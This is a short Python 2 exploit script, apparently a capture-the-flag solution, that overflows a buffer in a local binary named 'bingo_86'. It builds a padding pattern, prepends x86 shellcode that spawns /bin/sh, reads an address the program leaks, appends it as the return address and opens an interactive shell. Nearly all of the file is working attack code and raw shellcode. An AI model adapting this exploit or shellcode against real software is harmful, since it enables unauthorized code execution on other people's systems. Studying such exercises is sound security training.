#!/usr/bin/env python
# encoding:utf-8

import zio
import binascii

def junk(length):
    result = ""
    size = int(length / 4.0)
    for i in range(size):
        result += chr(ord("A") + i) * 4
    result += "@" * 4
    return result[0:length]

def cut(payload, mark):
    temp = zio.l32(mark)
    return payload.split(temp)[0]

def cover(shellcode, payload):
    return (shellcode + payload)[0:len(payload)]


shellcode = "\x31\xc0\x31\xdb\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x51\x52\x55\x89\xe5\x0f\x34\x31\xc0\x31\xdb\xfe\xc0\x51\x52\x55\x89\xe5\x0f\x34"

payload = junk(128)
payload = cut(payload, 0x51515050)
payload = cover(shellcode, payload)

Io = zio.zio("./bingo_86")

content = Io.readline()
address = zio.l32(int(content.replace("I am at ", "")[2:-1], 16))
print binascii.b2a_hex(address)
payload = payload + address

Io.write(payload)
Io.interact()
